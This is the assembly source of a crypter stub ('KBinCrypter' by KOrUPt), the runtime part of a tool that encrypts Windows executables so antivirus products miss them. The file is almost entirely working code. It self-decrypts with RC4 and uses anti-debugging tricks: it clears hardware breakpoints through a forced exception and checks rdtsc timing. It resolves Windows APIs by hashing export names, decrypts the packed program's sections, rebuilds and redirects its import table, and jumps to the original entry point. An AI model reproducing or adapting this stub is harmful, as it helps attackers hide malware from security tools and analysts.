
;-------------------------------------------------------------------
; KBinCrypter Stub BETA V1.0 (C) KOrUPt
;	Stub file for KBC
;
;	Changelog:
;		01/08/10:
;			- Alpha > BETA
;			- Reset version numbers; V1.0
;			- Commented out TLS related placeholders; data globals
;		31/07/10:
;			- Added internal stub encryption; Stub decrypter
;		27/07/10::
;			- Added code to make sections writable in memory
;-------------------------------------------------------------------

[bits 32]
section .text
	global _main

%macro __jmp_api 0
	db 0xFF, 0x25 		; mov eax, eax; jmp addr
						; alternative: mov eax, addr; jmp eax
%endmacro

%define use_api_hashes 1

;-------------------------------
; main stub code
;-------------------------------
_main:
	;-------------------------------
	; our code needs to be relocatable so we need to think relative
	;-------------------------------
	pushad
	call GetBasePointer
	GetBasePointer:
	pop	ebp
	sub	ebp, GetBasePointer
	
	;-------------------------------
	; decrypt stub
	;  loader encrypts stub code with randomly generated key
	;  using RC4 cipher. 
	;  The below code decrypts the majority of the stub
	;-------------------------------
	call 	GetEIP
	GetEIP:
	pop 	eax							; pop eip
	add		eax, 36						; 36 bytes = n = size of decrypter stub
	push 	12						 	; constant of 12
	push 	dword [ebp + dwStubSize]	; filled in by loader
	lea 	esi, [ebp + szStubKey]		; filled in by loader
	push 	esi
	push 	eax
	call	RC4							; decrypt stub and let's get moving
	add 	esp, 16
	
	; all code below here is encrypted with a randomly generated key!
	_dwStartCryptSig: 
		db(0xDE) 
			db(0xAD) 
				db(0xC0) 
					db(0xDE)

	
	jmp _skipHwbpHandler
	_hwbpExceptionHandler:			; clears hardware breakpoints
	xor	eax, eax
    mov	ecx, [esp + 0ch]			; our ctx structure on the stack
	mov	dword [ecx + 08h], eax		; dr1
    mov	dword [ecx + 0ch], eax		; dr2
	mov	dword [ecx + 04h], eax		; dr0
    mov	dword [ecx + 10h], eax		; dr3
    add	dword [ecx + 0b8h], 2		; we add 2 to EIP to skip the div eax
    retn
	_skipHwbpHandler:

	;-------------------------------
	; get kernel32 imagebase(required for when we need to walk its EAT)
	;-------------------------------
	xor eax, eax
	add eax, [fs:eax + 30h]
	test eax, eax
	mov eax, [eax + 0ch]
	mov esi, [eax + 1ch]
	lodsd
	mov eax, [eax+8]
	mov [ebp + dwK32BaseAddr], eax

	;-------------------------------
	; walk kernel32's EAT and obtain address's of GetProcAddress() and LoadLibrary()
	;-------------------------------
	mov	esi, [ebp + szLoadLibrary]
	call GetK32ApiAddress
	mov	[ebp + pLoadLibrary], eax
	mov	esi, [ebp + szGetProcAddr]
	call GetK32ApiAddress
	mov	[ebp + pGetProcAddress], eax
	
	;-------------------------------
	; resolve required API's	
	;-------------------------------
	mov	esi, [ebp + szVirtualProtect]
	call	GetK32ApiAddress
	mov	[ebp + pVirtualProtect], eax	

	mov	esi, [ebp + szVirtualAlloc]
	call	GetK32ApiAddress
	mov	[ebp + pVirtualAlloc], eax
	
	;-------------------------------
	; set up our jmp table
	;-------------------------------
	lea	eax, [ebp + pLoadLibrary]
	mov [ebp + __jmpLoadLibrary + 2], eax
	
	lea	eax, [ebp + pGetProcAddress]
	mov [ebp + __jmpGetProcAddress + 2], eax
	lea	eax, [ebp + pVirtualProtect]
	mov	[ebp + __jmpVirtualProtect + 2], eax
	
	lea	eax, [ebp + pVirtualAlloc]
	mov	[ebp + __jmpVirtualAlloc + 2], eax

	;-------------------------------
	; clear hw breakpoints
	;-------------------------------
	lea		eax, [ebp + _hwbpExceptionHandler]
	push	eax
	push	dword [fs:0]	; address of previous exception handler
	mov		[fs:0], esp		; write the new handler
    
	xor	eax, eax
    div	eax				; cause an exception
    pop	dword [fs:0]	; execution continues here
    add	esp, 4
	
	;-------------------------------
	; timing attack... Anti-Debug via rdtsc
	;-------------------------------
	rdtsc
	push eax
	push eax
	push ecx
	xor	eax, eax
	mov	ecx, 4096
	_wasteCycles:
		inc	eax
		or	eax, ecx 
		dec	ecx
		test ecx, ecx
	jnz	_wasteCycles
	pop	ecx
	pop	eax
	rdtsc
	sub	eax, [esp]	;ticks delta
	add	esp, 4
	cmp	eax, 10000h ;threshold
	jb _rdtscNoDebugger
		retn ; oops
	_rdtscNoDebugger:

	;-------------------------------
	; make PE headers writable
	;-------------------------------
	lea	eax, [ebp + pTemp]
	push	eax						; &pTemp
	push 0x04						; PAGE_READWRITE
	mov	eax, [ebp + dwImagebase]
	add	eax, [eax + 0x3C]			; eax -> IMAGE_NT_HEADERS
	push	dword  [eax + 0x54]
	push	dword [ebp + dwImagebase]
	call __jmpVirtualProtect		; VirtualProtect(dwImagebase, SizeOfHeaders, PAGE_READWRITE, &pTemp)
	
	;-------------------------------
	; decrypt sections
	;-------------------------------
	mov	ebx, [ebp + dwImagebase]	; ebx = imagebase
	mov	eax, ebx					; eax = imagebase
	add	eax, dword [ebx + 3Ch] 		; eax = pe header
	movzx	ecx, word [eax + 6h]	; ecx = number of sections
	add	eax, 0f8h					; pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)

	mov	[ebp + nSections], ecx		
	mov	[ebp + sectionTable], eax
	
	dec ecx							; last section = iat, section before last = stub
	dec ecx
	
	_decryptSection:
		push	ecx 				; store nSections
		
		; load section table
		mov	eax, [ebp + sectionTable]
		push eax ; store section table
		
		_isResourceSection:
		; is this a resource section?
		lea edi, [ebp + szRsrcName]		; edi = section name we're filtering, ".RSRC"
		mov	esi, eax					; name of section to decrypt
		call _toupper
		mov ecx, 5						; length of ".RSRC"
		cld								; clear direction flags
		repe	cmpsb					; compare section names
		pop eax							; restore section table
		jz _nextSection 				; got a match? then skip section
		
		; no match... so make section writable
		
		;-------------------------------
		; make sections writable
		;-------------------------------
		lea	ecx, [ebp + pTemp]
		push ecx			; &pTemp
		push 0x04			; PAGE_READWRITE
		
		; push size of section
		add eax, 12			; get vaddr
		mov esi, [eax]
		add esi, ebx		; ebx = imagebase
		add	eax, 4			; obtain size of section
		push dword [eax]	; push section vsize
		
		; push vaddr of section
		push dword esi	; push vaddr
		call __jmpVirtualProtect	; VirtualProtect(vaddr, rsize, PAGE_READWRITE, &pTemp)
		;-------------------------------
		
		lea	edx, [ebp + szKey] 			; load decryption key
		
		; push dwKeyLen
		push edx						; lpKey
		call _strlen
		add	esp, 4
		dec	eax
		push eax						; dwKeyLen
		
		; push dwBufLen(vsize of section)
		mov	eax, [ebp + sectionTable] 	; load section table
		add	eax, 0x10					; obtain size of raw data
		push dword [eax]				; dwBufLen
		
		; push lpKey
		push	edx						; lpKey
		
		; push lpBuff
		push	esi						; lpBuff
		call RC4						; RC4(lpBuf, lpKey, dwBufLen, dwKeyLen)
		add esp, 16
		
		; next section
		_nextSection:
		add dword [ebp + sectionTable], 40		; next section
		pop	ecx									; restore nSections
		dec	ecx									; decrease section count
	jnz _decryptSection
	
	;-------------------------------
	; rebuild relocations
	;-------------------------------
	jmp _reloc_fixup
	
	;-------------------------------
	; rebuild IAT
	;-------------------------------
	_RebuildIAT:
	lea	eax, [ebp + szDllRedirectionList]
	push	eax
	push	dword [ebp + dwIatVa]
	push	dword [ebp + dwImagebase]
	call	RebuildAndRedirectIat
	
	; call TLS callbacks
		
	;-------------------------------
	; reach oep
	;-------------------------------
	mov	eax, dword [esp + 0x24]
	mov	eax, dword [ebp + dwOEP]
	mov	[esp +0x1C], eax
	popad
	push	eax
	xor	eax, eax
	retn
	
	;-------------------------------
	; BELOW ARE FUNCTIONS AND SUBROUTINES USED THROUGHOUT THE STUB
	;-------------------------------

;-------------------------------
; fix relocation table. taken from Morphine
;-------------------------------
_reloc_fixup:
    mov	eax, [ebp + dwImagebase]
    mov	edx, eax
    mov	ebx, eax
    add	ebx, [ebx + 3Ch] 					; edi -> IMAGE_NT_HEADERS
    mov	ebx, [ebx + 034h]					; edx ->image_nt_headers->OptionalHeader.ImageBase
    sub	edx, ebx 							; edx -> reloc_correction // delta_ImageBase
    je	_reloc_fixup_end
    mov	ebx, [ebp + dwRelocVa]
    test	ebx, ebx
    jz	_reloc_fixup_end
    add	ebx, eax
_reloc_fixup_block:
    mov	eax, [ebx + 004h]          			; ImageBaseRelocation.SizeOfBlock
    test	eax, eax
    jz	_reloc_fixup_end
    lea	ecx, [eax - 008h]
    shr	ecx, 001h
    lea	edi, [ebx + 008h]
_reloc_fixup_do_entry:
        movzx	eax, word [edi]				; Entry
        push	edx
        mov	edx,eax
        shr	eax, 00Ch            			; Type = Entry >> 12
        mov	esi, [ebp + dwImagebase]		; ImageBase
        and	dx, 00FFFh
        add	esi, [ebx]
        add	esi, edx
        pop	edx
_reloc_fixup_HIGH:              			; IMAGE_REL_BASED_HIGH  
        dec	eax
        jnz _reloc_fixup_LOW
            mov	eax,edx
            shr	eax, 010h        			; HIWORD(Delta)
            jmp	_reloc_fixup_LOW_fixup        
_reloc_fixup_LOW:               			; IMAGE_REL_BASED_LOW 
            dec	eax
        jnz _reloc_fixup_HIGHLOW
        movzx	eax, dx            			; LOWORD(Delta)
_reloc_fixup_LOW_fixup:
            add	word [esi], ax				; mem[x] = mem[x] + delta_ImageBase
        jmp	_reloc_fixup_next_entry
_reloc_fixup_HIGHLOW:        				; IMAGE_REL_BASED_HIGHLOW
            dec	eax
        jnz	_reloc_fixup_next_entry
        add	[esi],edx           			; mem[x] = mem[x] + delta_ImageBase
_reloc_fixup_next_entry:
        inc	edi
        inc	edi								; Entry++
        loop	_reloc_fixup_do_entry
_reloc_fixup_next_base:
    add	ebx, [ebx + 004h]
    jmp	_reloc_fixup_block
_reloc_fixup_end:
	jmp _RebuildIAT

	;-------------------------------
	; Input:  Hash of API or name of API in esi
	; Output: Address of API(eax)
	;-------------------------------
	GetK32ApiAddress:
		xor	eax, eax
		mov	edx, esi
		
		mov	esi, dword [ebp + dwK32BaseAddr]
		add 	esi, 0x3C
		lodsw                             
		
		add	eax, dword [ebp + dwK32BaseAddr]
		mov	esi, [eax + 0x78]
		add	esi, [ebp + dwK32BaseAddr]
		add	esi, 0x1C
		
		lodsd
		add	eax, [ebp + dwK32BaseAddr]
		mov	dword [ebp + dwAddressTableVa], eax
		
		lodsd
		add	eax, [ebp + dwK32BaseAddr]
		push	eax
		
		lodsd
		add	eax, [ebp + dwK32BaseAddr]
		mov	dword [ebp + dwOrdinalTableVa], eax
		pop	esi	; esi = name pointer table VA
		
		; walk EAT API name table
		mov	word [ebp + i], 0
		_gotoNextApi:   
			push	esi
			lodsd
			add	eax, [ebp + dwK32BaseAddr]
			mov	esi, eax    	; esi   = VA of API name
			call	_HashApiName
			cmp	dword eax, dword edx ; compare hash to hashed api name

			jz	_gotApiAddress
				pop	esi      		     
				add	esi, 4               	
				inc	word [ebp + i]       
		jmp _gotoNextApi
			
		_gotApiAddress:   
		pop	esi
		movzx	eax, word [ebp + i]
		shl	eax, 1
		add	eax, dword [ebp + dwOrdinalTableVa]
		xor 	esi, esi                         
		xchg	eax, esi                         
		lodsw                                   
		shl	eax, 2
		add	eax, dword [ebp + dwAddressTableVa]
		mov	esi, eax                        	
		lodsd                                   
		add	eax, [ebp + dwK32BaseAddr]               
		retn
	
;-------------------------------
; Input: API name in esi
;  Hashes an API name
;-------------------------------
_HashApiName:	
	xor	eax, eax
	push	edi
	xor	edi, edi
	_generateHash:
	lodsb
	test	al, al
	jz	_hashed
		ror	edi, 0xd
		add	edi, eax
	jmp	_generateHash
	_hashed:
	mov	eax, edi
	pop	edi
	retn

;-------------------------------
; Make string uppercase
; 	Input: address of string in esi
;-------------------------------
_toupper:
	push	ecx
	xor	ecx, ecx
	_checkChars:
	cmp	byte [esi], 'a'
	jb	_checkNextChar
	cmp	byte [esi], 'z'
	ja	_checkNextChar
	and	byte [esi], 0xDF
	_checkNextChar:
	inc	esi
	inc	ecx
	cmp	byte [esi], 0x00
	jnz	_checkChars
	
	_exitRoutine:
	sub	esi, ecx
	pop	ecx
	retn

_strlen:
	push	edi
	sub	ecx, ecx
	mov	edi, [esp + 8]
	not	ecx
	sub	al, al
	cld
	repne	scasb
	not	ecx
	pop	edi
	lea	eax, [ecx]
	retn

; --------------- fix up the import table ----------------
; ebp+10h	[ebp+_p_szKERNEL32_r]
; ebp+0ch	dwIatVa
; ebp+08h	_p_dwImageBase
; ---------------------------------
; ebp-04h		dwNewIatVa
; ebp-08h		_p_dwThunk
; ebp-0ch		_p_dwHintName
; ebp-10h		_p_dwLibraryName
; ebp-14h		_p_dwAPIaddress
; ebp-18h		_p_dwFuncName
;-------------------------------

RebuildAndRedirectIat:
	push	ebp
	mov	ebp, esp
	add	esp, -18h				; prolog
	push	0x4
	push	0x01000 
	push	0x01D000
	push	0x00
	call	__jmpVirtualAlloc	; dwNewIatVa = VirtualAlloc(NULL, 0x01D000, MEM_COMMIT, PAGE_READWRITE);
	mov	[ebp - 04h], eax
	mov	ebx, [ebp + 0Ch]		; ebx = dwIatVa
	test	ebx, ebx
	jz near  _iatRebuildEnd
	mov	esi, [ebp + 08h]		; esi = imagebase
	add	ebx, esi				; dwImportVirtualAddress += dwImageBase
	_iatLoadLibraryLoop:
		mov	eax, [ebx + 0Ch]	; eax = [dwIatVa + 0Ch] =  image_import_descriptor.Name
		test	eax, eax
		jz near _iatRebuildEnd
		
		mov	ecx, [ebx + 10h]	; ecx = [dwIatVa + 10h]  = image_import_descriptor.FirstThunk
		add	ecx, esi			; ecx += imagebase
		mov	[ebp - 08h], ecx	; dwThunk = ecx
		mov	ecx, [ebx]			; image_import_descriptor.Characteristics
		test	ecx, ecx			; check Characteristics != NULL
		jnz _iatGotCharacteristics
			mov	ecx, [ebx + 10h] ; characteristics, use OriginalFirstThunk
		_iatGotCharacteristics:
		add	ecx, esi				 ; ecx += imagebase
		mov	[ebp - 0Ch], ecx		 ; store dwHintName
		add	eax, esi				 ; image_import_descriptor.Name + dwImageBase = ModuleName
		push	eax					 ; lpLibFileName
		mov	[ebp - 10h], eax		 ; pLibraryName = eax = ModuleName
		call	__jmpLoadLibrary	 ; LoadLibrary(lpLibFileName);
		test	eax, eax			 ; library loaded successfully?
		jz	near _iatRebuildEnd		 ; if not, fail epically...
		mov	edi, eax				 ; edi = hDllHandle
		_iatGetProcAddrLoop:
			mov	ecx, [ebp - 0ch]	 ; ecx = dwHintName
			mov	edx, [ecx]			 ; edx =  image_thunk_data.Ordinal
			test	edx, edx			 ; do we have more functions to import?
			jz	near _iatCheckNextModule	; no? next module
			test	edx, 080000000h		; are we importing by ordinal?
			jz	_iatUseName 				; no? ok use the function names
				and	edx, 07FFFFFFFh		; otherwise, get ordinal
				jmp _iatGetFuncAddress

		_iatUseName:
			add	edx, esi	; image_thunk_data.Ordinal + dwImageBase = OrdinalName
			inc	edx			; ...
			inc	edx			; edx = OrdinalName.Name

		_iatGetFuncAddress:
			mov	[ebp - 18h], edx

			push	edx	; lpProcName
			push	edi	; hModule						
			call	__jmpGetProcAddress
			mov	[ebp - 14h], eax	; dwAPIaddress
			
			;-------------------------------
			; API redirection...
			; mov 	[ecx], eax	; ...typically we'd fill this in and move onto the next module...
			; ...but we need to check for API's we want to redirect
			;-------------------------------
			
			push	edi	; store hModule
			push	esi	; store imagebase
			push	ebx	; store dwImportVirtualAddress += dwImageBase
			
			; make pLibraryName uppercase
			mov	esi, [ebp - 10h]	; esi  = pLibraryName
			call _toupper
			
			mov	edi, [ebp + 010h]	; edi  = [ebp + szDllRedirectionList]
			
			_iatCheckRedirectionList:
			push	edi
			call	_strlen
			add	esp, 4
			mov ecx, eax		; ecx = redirection library name length
			
			; do we want to redirect calls from within this dll? ...
			push	edi			; store edi = dll redirection library name
			push	esi			; store esi = current library name
			
			push	ecx			; store ecx = dll redirection library name length
			cld					; clear direction flags
			repe	cmpsb		; compare library names
			pop	ecx				; restore dll redirection library length
			jz _iatUseRedirection 	; got a match?
			pop	esi					; restore library name
			pop	edi					; restore dll redirection list
			add	edi, ecx			; move onto next dll in redirection list
			cmp	dword [edi], 0x0	; end of dll redirection list?
			jnz _iatCheckRedirectionList
			; don't use redirection...
			mov	ecx, [ebp - 08h]		; ecx = dwThunk
			mov	eax, [ebp - 014h]		; eax = dwApiAddress
			mov	[ecx], eax				; func address written!
			jmp _iatCheckNextFunction	; next function :D
			
			_iatUseRedirection:
			; use redirection 
				pop	esi	; restore library name
				pop	edi	; restore dll redirection list
				mov	edi, [ebp - 04h]	; edi = dwNewIatVa
				mov	byte [edi], 0e9h	; byte [edi] = 0xE9(prep for jmp)
				
				mov	eax, [ebp - 14h] ; eax = dwApiAddress
				; calc for jump
				sub	eax, edi
				sub	eax, 05h
				; write api address + jmp opcode
				mov	[edi + 1], eax
				mov	word [edi + 05], 0C08Bh
				mov	ecx, [ebp - 08h] 			; ecx = dwThunk 
				mov	[ecx], edi					; func address written!
				add	dword [ebp - 04h], 07h 		; dwNewIatVa += 07h
			_iatCheckNextFunction:				; next module!!
			pop	ebx	; restore dwImportVirtualAddress += dwImageBase
			pop	esi	; restore imagebase
			pop	edi	; restore hmodule
			add	dword [ebp - 08h], 004h	; dwThunk => next dwThunk
			add	dword [ebp - 0ch], 004h	; dwHintName => next dwHintName
		jmp _iatGetProcAddrLoop
	_iatCheckNextModule:
		add	ebx, 014h	; sizeof(IMAGE_IMPORT_DESCRIPTOR)
	jmp _iatLoadLibraryLoop
	_iatRebuildEnd:
	mov	esp, ebp 	; < epilog
	pop	ebp
	retn 	0ch

		; list of DLL's to redirect	
	szDllRedirectionList:
		db "KERNEL32.DLL", 0
		db "SHELL32.DLL", 0
		db "COMCTL32.DLL", 0
		db "USER32.DLL", 0
		db "GDI32.DLL", 0
		db "ADVAPI32.DLL", 0
		dd(0x00000000)

	; internal import name table
	szVirtualProtect:	dd 07946c61bh
	szGetProcAddr:		dd 07c0dfcaah
	szLoadLibrary:		dd 0ec0e4e8eh
	szVirtualAlloc:		dd 091afca54h
	dd(0x00000000)


_dwEndCryptSig: 
		db(0xDE) 
			db(0xAD) 
				db(0xBE) 
					db(0xEF)
		
; -------------------------------------------------------------------
; 	RIPPED AND CONVERTED RC4 FUNCTION
;	void RC4(LPBYTE lpBuf, LPBYTE lpKey, DWORD dwBufLen, DWORD dwKeyLen)
;	Function is placed here as it is required by our mini-decrypter(do not move it above crypt sig)
;-------------------------------
RC4:                               ;<= Procedure Start
    push    ebp
    mov     ebp, esp
    sub     esp, 0410h
    push    esi
    mov     dword [ebp-8], 0
    mov     dword [ebp-4], 0
    jmp     _rc4_00401093

_rc4_0040108a:

    mov     eax, [ebp-4]
    add     eax, 1
    mov     [ebp-4], eax

_rc4_00401093:

    cmp     word [ebp-4], 0100h
    jge     _rc4_004010ab
    mov     ecx, [ebp-4]
    mov     edx, [ebp-4]
    mov     dword [ebp+ecx*4-0408h], edx
    jmp     _rc4_0040108a

_rc4_004010ab:

    mov     dword [ebp-4], 0
    jmp     _rc4_004010bd

_rc4_004010b4:

    mov     eax, [ebp-4]
    add     eax, 1
    mov     [ebp-4], eax

_rc4_004010bd:

    cmp     word [ebp-4], 0100h
    jge     _rc4_00401134
    mov     ecx, [ebp-4]
    mov     esi, [ebp-8]
    add     esi, dword  [ebp+ecx*4-0408h]
    mov     eax, [ebp-4]
    xor     edx, edx
    div     dword [ebp+0x14]
    mov     eax, [ebp+0xC]
    xor     ecx, ecx
    mov     cl, byte  [eax+edx]
    add     esi, ecx
    and     esi, 0800000ffh
    jns     _rc4_004010f5
    dec     esi
    or      esi, 0ffffff00h
    inc     esi

_rc4_004010f5:

    mov     [ebp-8], esi
    mov     edx, [ebp-4]
    mov     al, byte  [ebp+edx*4-0408h]
    mov     byte  [ebp-0410h], al
    mov     ecx, [ebp-4]
    mov     edx, [ebp-8]
    mov     eax, dword  [ebp+edx*4-0408h]
    mov     dword  [ebp+ecx*4-0408h], eax
    mov     ecx, [ebp-0x410]
    and     ecx, 0ffh
    mov     edx, [ebp-8]
    mov     dword  [ebp+edx*4-0408h], ecx
    jmp     _rc4_004010b4

_rc4_00401134:

    mov     dword [ebp-0x40C], 0
    jmp     _rc4_0040114f

_rc4_00401140:

    mov     eax, [ebp-0x40C]
    add     eax, 1
    mov     [ebp-0x40C], eax

_rc4_0040114f:

    mov     ecx, [ebp-0x40C]
    cmp     ecx, [ebp+0x10]
    jnb     near _rc4_00401217
    mov     edx, [ebp-4]
    add     edx, 1
    and     edx, 0800000ffh
    jns     _rc4_00401174
    dec     edx
    or      edx, 0ffffff00h
    inc     edx

_rc4_00401174:

    mov     [ebp-4], edx
    mov     eax, [ebp-4]
    mov     ecx, [ebp-8]
    add     ecx, dword  [ebp+eax*4-0408h]
    and     ecx, 0800000ffh
    jns     _rc4_00401194
    dec     ecx
    or      ecx, 0ffffff00h
    inc     ecx

_rc4_00401194:

    mov     [ebp-8], ecx
    mov     edx, [ebp-4]
    mov     al, byte  [ebp+edx*4-0408h]
    mov     byte  [ebp-0410h], al
    mov     ecx, [ebp-4]
    mov     edx, [ebp-8]
    mov     eax, dword  [ebp+edx*4-0408h]
    mov     dword  [ebp+ecx*4-0408h], eax
    mov     ecx, [ebp-0x410]
    and     ecx, 0ffh
    mov     edx, [ebp-8]
    mov     dword  [ebp+edx*4-0408h], ecx
    mov     eax, [ebp-4]
    mov     ecx, dword  [ebp+eax*4-0408h]
    mov     edx, [ebp-8]
    add     ecx, dword  [ebp+edx*4-0408h]
    and     ecx, 0800000ffh
    jns     _rc4_004011f5
    dec     ecx
    or      ecx, 0ffffff00h
    inc     ecx

_rc4_004011f5:

    mov     eax, [ebp+8]
    add     eax, [ebp-0x40C]
    mov     dl, byte  [eax]
    xor     dl, byte  [ebp+ecx*4-0408h]
    mov     eax, [ebp+8]
    add     eax, [ebp-0x40C]
    mov     byte  [eax], dl
    jmp     _rc4_00401140

_rc4_00401217:

    pop     esi
    mov     esp, ebp
    pop     ebp
    retn                                     ;<= Procedure End
; -------------------------------------------------------------------


;-----------------------------------------------------------
	; important data and variable's(filled in by crypter, do NOT modify)
	; do not modify the order of any variable's who's contents == 0xCCCCCCCC
	dwOEP:					dd(0xCCCCCCCC) 
								db(0x00)
	dwImagebase:			dd(0xCCCCCCCC)
								db(0x00)
	dwIatVa:				dd(0xCCCCCCCC) 
								db(0x00)
	
	; misc variable's
	szKey:				db "KOrUPt", 0
	szRsrcName:			db ".RSRC", 0
	pTemp:				dd(0xFFFFFFFF)
	dwK32BaseAddr:		dd(0xFFFFFFFF)
	dwOrdinalTableVa:	dd(0xFFFFFFFF)
	dwAddressTableVa:	dd(0xFFFFFFFF)
	dwThunk:			dd(0xFFFFFFFF)
	dwHintName:			dd(0xFFFFFFFF)
	i:					dw(0x0000)
	
	; section table variable's...
	sectionTable:			dd(0xFFFFFFFF)
	nSections:				dw(0x0000)

;-----------------------------
	; backed up TLS table(DO NOT MOVE)
	;_tls_dwStartAddressOfRawData:	dd(0xCCCCCCCC)
	;_tls_dwEndAddressOfRawData:		dd(0xCCCCCCCC)
	;_tls_dwAddressOfIndex:			dd(0xCCCCCCCC)
	;_tls_dwAddressOfCallBacks:		dd(0xCCCCCCCC)
	;_tls_dwSizeOfZeroFill:			dd(0xCCCCCCCC)
	;_tls_dwCharacteristics:			dd(0xCCCCCCCC)
	
	; PROXY TLS TABLE(DO NOT MOVE)
	;_Ptls_dwStartAddressOfRawData:	dd(0xCCCCCCCC)
	;_Ptls_dwEndAddressOfRawData:	dd(0xCCCCCCCC)
	;_Ptls_dwAddressOfIndex:			dd(0x00000000)
	;_Ptls_dwAddressOfCallBacks:		dd(_Ptls_callbackArry)
	;_Ptls_dwSizeOfZeroFill:			dd(0xCCCCCCCC)
	;_Ptls_dwCharacteristics:		dd(0xCCCCCCCC)

	;_Ptls_callbackArry:
	;								dd(0x00000000);dd(_TlsHandler)
	;								dd(0x00000000)
	;TLS_slot_index: 				dd(0x00000000)
;-----------------------------

	; relocation table storage(DO NOT MOVE)
	dwRelocVa:				dd(0xCCCCCCCC) 
							db(0x00)
	
	; mini-decrypter key settings, updated by loader
	dwStubSize:				dd(0xCCCCCCCC)
							db(0x00)
	; updated by loader
	szStubKey:				db "HavocBounded", 0
	
	
	; internal address table
	pLoadLibrary:			dd(0xFFFFFFFF)
	pGetProcAddress:		dd(0xFFFFFFFF)
	pVirtualProtect:		dd(0xFFFFFFFF)
	pVirtualAlloc			dd(0xFFFFFFFF)

	; internal API JMP table
	__jmpLoadLibrary:			__jmp_api 
										dd(0xFFFFFFFF)
	__jmpGetProcAddress:		__jmp_api 
										dd(0xFFFFFFFF)
	__jmpVirtualProtect:		__jmp_api 
										dd(0xFFFFFFFF)
	__jmpVirtualAlloc:			__jmp_api 
										dd(0xFFFFFFFF)
	
	